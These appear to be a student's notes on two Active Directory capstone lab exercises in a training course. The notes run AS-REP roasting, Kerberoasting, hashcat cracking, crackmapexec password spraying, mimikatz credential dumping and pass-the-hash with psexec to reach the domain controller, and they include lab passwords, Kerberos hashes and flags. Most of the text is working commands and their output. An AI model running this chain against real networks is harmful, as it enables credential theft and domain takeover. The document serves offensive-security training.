1. **Capstone Exercise**: Once VM Group 2 is started, the domain _corp.com_ has been modified. Use the techniques from this Module to obtain access to the user account _maria_ and log in to the domain controller. To perform the initial enumeration steps you can use _pete_ with the password _Nexus123!_. You'll find the flag on the Desktop of the domain administrator on DC1. If you obtain a hash to crack, create and utilize a rule file which adds nothing, a "1", or a "!" to the passwords of **rockyou.txt**.

DC IP: 192.168.225.70



![[Pasted image 20250215154712.png]]

Got mike and dave's asrep hashes but hashcat is having trouble cracking them. may need to create a custom wordlist. 

Run `net accounts`
Password minimum length is 7. 
Our password to login is Nexus123!

So policy is probably one uppercase, one number, one special character.

Realize I didn't make a password rule.....
`sudo hashcat -m 18200 mike-asrep /usr/share/wordlists/rockyou.txt -r one-or-bang.rule`

Finally cracked mike's asrep hash as `Darkness1099!`

![[Pasted image 20250215205044.png]]

Gonna password spray to see if we get maria's password. 

`crackmapexec smb 192.168.225.70 -u users.txt -p 'Darkness1099!' -d corp.com --continue-on-success`


Mike is an admin on CLIENT75

![[Pasted image 20250215210915.png]]

`./psexec.py mike@192.168.225.75 `

```
mimikatz # Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

664     {0;000003e7} 1 D 41499          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;000003e7} 0 D 4775135     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,28p)       Primary
 * Thread Token  : {0;000003e7} 1 D 4806230     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)

sekurlsa::logonpasswords
mimikatz # 
Authentication Id : 0 ; 1189900 (00000000:0012280c)
Session           : Service from 0
User Name         : maria
Domain            : CORP
Logon Server      : DC1
Logon Time        : 2/15/2025 11:25:43 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-22102
        msv :
         [00000003] Primary
         * Username : maria
         * Domain   : CORP
         * NTLM     : 2a944a58d4ffa77137b2c587e6ed7626
         * SHA1     : 334214b2b9e5e6059269ca4e9cb5b16cf779dc07
         * DPAPI    : 49e3867770762547715227fab20efcc6
        tspkg :
        wdigest :
         * Username : maria
         * Domain   : CORP
         * Password : (null)
        kerberos :
         * Username : maria
         * Domain   : CORP.COM
         * Password : (null)
        ssp :
        credman :
        cloudap :       KO
```

Maria's NTLM hash: `2a944a58d4ffa77137b2c587e6ed7626`

psexec as maria to dc worked. #passthehash 

![[Pasted image 20250215222908.png]]
`└─$ ./psexec.py -hashes 2a944a58d4ffa77137b2c587e6ed7626:2a944a58d4ffa77137b2c587e6ed7626 maria@192.168.225.70`


`OS{1fe58d1e4368c074644f3547f192c380}`


1. **Capstone Exercise**: Once VM Group 3 is started, the domain _corp.com_ has been modified. By examining leaked password database sites, you discovered that the password _VimForPowerShell123!_ was previously used by a domain user. Spray this password against the domain users _meg_ and _backupuser_. Once you have identified a valid set of credentials, use the techniques from this Module to obtain access to the domain controller. You'll find the flag on the Desktop of the domain administrator on DC1. If you obtain a hash to crack, reuse the rule file from the previous exercise.

`crackmapexec smb 192.168.225.70 -u users.txt -p 'VimForPowerShell123!' -d corp.com --continue-on-success`

DC1: **192.168.225.70**
web04: **192.168.225.72**
files04: **192.168.225.73**
client75: **192.168.225.75**
client74:**192.168.225.74**

password works for meg

![[Pasted image 20250215223921.png]]

kerberoastable
`impacket-GetNPUsers -dc-ip 192.168.225.70  -request -outputfile hashes.asreproast corp.com/meg `

got dave's asrep hash

`$krb5asrep$23$dave@CORP.COM:3396c2459a871316ec94e7f33354e9de$47705ee950b3831859e26f54d1c8b5fc80384ef169d35cfce045f13a2a3a79737a5c3f5005accd92794bb8396a9f580c5f849561286c0c6afa764c0f4327a52d8863cc34a3021b15b7e306f26de11c1b9f1d44de86f5689c5f57559cb6fc978dbcc4b6680d7b71ff168daddd4dbdd5fd6da0d4dcd7ad6249893a2c76f1873f7906429653205094df892d2b9927cd93671a2bdc563bde37cda67549e6a1f5cfc2375106bb1f73aeeb8521368e64e7a73caa235312745b377c3073110a8d16b716c009409b5dcaa81fb915c96f1533d4a0e94117108f80d45b53ac6ca60f8870055abc3503`

Crack with hashcat 

`sudo hashcat -m 18200 dave-asrep /usr/share/wordlists/rockyou.txt -r one-or-bang.rule`

Pass: Flowers1

![[Pasted image 20250215225519.png]]

might password spray again..

`crackmapexec smb 192.168.225.70 -u dave -p 'Flowers1' -d corp.com --continue-on-success`

 no pwned.


`sudo impacket-GetUserSPNs -request -dc-ip 192.168.225.70 corp.com/dave`

lots of stufffff

```
$krb5tgs$23$*iis_service$CORP.COM$corp.com/iis_service*$a4a92791084766b3e83157bbe6fdbad5$31a7d123f7a270edb1c4b97b0f97b793e008a51cebf556740f3385d6eab41414b45622553ffe524882762a784b4f8c0b2c251eed7b2975bac8443a6e66045f4faa73b202f6c504fb504dc03e98a37f55689d9af0857991426fac0fc65be80c4801d2f28954be0eef162b9bd947b138b2cde43c8edbf0a0cc8cc72d3ddf9268921d65f0f2bfb58e3d1c8b68e4ae9a527abe0d2c5599eaa6e5c2927a6e9ada91648e011a4ecfe0177b6a17414f0e849fc34093b425a0325b0a2687b46e2d107ff17cb3be652a1f502c114a44b4f4aa0e6872847a0c3796949e6526d1718292050e1b7118920f5756b2ebd1fceb9d3a8b9c2ecd6869a973242685744cbb6af484f6978f5a29c31881dbfc05186b3bf3572b11d44965fa48cea5e147bf9cd6191748a0c093c03e6aa09fd2a76934f49115b9de60210eb995d065174e4d1529ab7d399a720a21c84de7e418eb2c1854b68a1ce911078890ecec6ffb4be67d35ccfd9738648cbea327e094a30c3bf3d026defbdd6572d1c1b48a53200046da6c684a1226f8b17285bf954c27dae5f8a745b1447af62d272336a9b53b80a79a8741b41b529bea96362602c44059514a13f0ac16175cee7ed325bd060f21c657fbd04af59da476b3014ebd0d04c15dad357af1952833af06ce26dd950d86c2ad921e978ea339bb6519a9790f96475d44ee730a45cc14925bc0e82a4e01fced8f1f7bcfc981af5f021cf80a65e9dc49bad9e354862742495d476dcd5e4b3363e0651abbe7452b0a2ce0e1093d411bafbfc01c17428789081114433a01bb0c5d355d4df9e7ebe5500c644e05f246a492fb300eb910b182ee991b16b8ecdf42cda05378a97e15375816eb2894a03604936430de2e9ab3820a8e5971f8fcb21019372fcdcd1d0deb9fd0f94f2cd5bb75cc6c59bfea15f8fcac01a8772b46921acc4d8c6c1b0ed0cc17df81d5d1b06f8e7b8004d388ec89eaab91999ad3fb38c149ec52958e3525bcf9687d37532ec52dfd4379e5ef30e160b3d0f1103728e425eda2b065baabf42b83a7057018141cfad9a78874288ca3df0f68080d27883be1bdbf565920532b7a304c2df18b9d8035a143ed67190bdad8b1bb2b15bb5ae1d14708f1ecf48e97bc992f7fe5fad68ce71caeb7b4d1d17fbc8fa1a61f1ff88664a1204b817375974dcd3e2ca98908d4a3fb2948996234d15b4a8c6c15d70d3b76cdb3d551ae8f671da8c3ff2c1fb13a32e6c241351b234b25ff4fa1747d2e56584736e76a89cbea0efd53e43a453d69bf8f9ce5d96ea897a759b3e32732729fd663729e896f2ca47bf24158000909147d2d9e0c29efaad51af120e67d04bef8e66a6713
$krb5tgs$23$*backupuser$CORP.COM$corp.com/backupuser*$9866c067b17b49abf5eb38b11e3d3a07$502512573987eb34498501a98bfa073c4998a2c1f39190ea974a4b5925f48826b287693a065cef6bd8540413bfc2ffdda22f66558d6a5e65478c3b2306c0b48dc82684e5326cf9f33260806ba3a9c2c6bbf396274c399aab53495ac31fb5c6cc35abfafcf72c9c82187684a0293c3af8a1c587935d13418bff2cc64b1cbf04e311f1d7d49e3fd09ecf4435d39bc3f4b3deb9f7f7d0b40697a95f10dcfdd2ab5c650dbfcfce0f4fe188913f12c8bb8b6c6f87d095882a912991c0343f3e4418688451afa1eb0443ef6e31ca01eaf129a7e0570c60659c90abf2cf995a6259d0ac2df10a5661a89892a19d2c3cac8bdf8f05cbb95800e4061e6df0596aa2366dec8239939e49cf5bacde5827ebb0b2df358c0dd671017ddf1e981ed40440c2d846e3a575a193d5e358a033721dcef57951cf1df6a5926a188082311fc2bb0cd9a049b07f490f457a50d69dfdf488c6e7122f2f4bbb16e64d80fe04697c48d9ee35015748b55598d97d5dd1e521229b6a97489c4d1ac6682143c6417b30debc983c26e62dc9139c2156fb86f7600d36ad0111d7677e39cc2529f07f0b0366934a25d170857652196a7c4c35090a40a46e26d8e7e0e91effab78a77dcb7605d0a76c27166428b07bf84515f8cd1ab00e521193396ae72983468f080549d0eeee0a3260b7a5468f9e74d49823765b0f3ad5d0445782bff60e84284cab23bbb34a8c179dad6a5f5ad8d80d230463f9e25734afa89dd00c853288333911b29266337d35a8470ee204ea475e0b56c97da7afb6ce11d75368510040de9a5682d42aea55a3f6369e77a55370563e74d6422c0ee816bbed950e5205311b48d0f7f86db354482974c5d3fd9a61eb0e6fe66686e4f83d066098bfdcf1dbcbd099cfee10ba2805f7f448c029d38cb7d4b6e2a10554cf5100f074432b90dfd61a9e136389ac4f3d594044d25954d51ed09b70192a45b8a9c6890baf1cbb7d4e4bd1a6850222482eef2d5370241a9828479034c144f00865d927c3b7ebafbeca5822be6f20bda752620f039a0b50de49326f48188fc0614e37dd313bb9af8db6edf97ac3d7387808487282c73a32ffdbe445d5bbd19a731df8c500218ed8cd8be0c919812957c2e1da69c2eeb612449296f685e430292ea4d8615da1df830b4ee1edaf88aa177e9d976dc85dc7f44eee75d4c926c00f2ad6c433d80e74403721f2e527381c07e1bce82d3e38cffa5c6976b04cb5624b34f98ff3855d6f9501e7c341897ec8f2d16385154e21fe068b97ec2984f9540e6384b6cd18ad3a2569a65ca310ad77be7f1478cb0a55884cf8ee1a461e17e7088f857b3633ab8476e68941b946abb3

```

![[Pasted image 20250215230238.png]]

`└─$ hashcat -h cat backupuser-tgs| grep -i Kerberos                                 `

`  13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol`


`sudo hashcat -m 13100 backupuser-tgs /usr/share/wordlists/rockyou.txt -r one-or-bang.rule`

it cracked hehehehe
`DonovanJadeKnight1`

![[Pasted image 20250215230625.png]]

trying crackmapexec again

`crackmapexec smb 192.168.225.70 -u backupuser -p 'DonovanJadeKnight1' -d corp.com --continue-on-success`

got pwned. psexec to connect

![[Pasted image 20250215230803.png]]
`./psexec.py backupuser@192.168.225.70 `

![[Pasted image 20250215231017.png]]
`OS{fa41b478ce5668a2cde1fa0c891f3209}`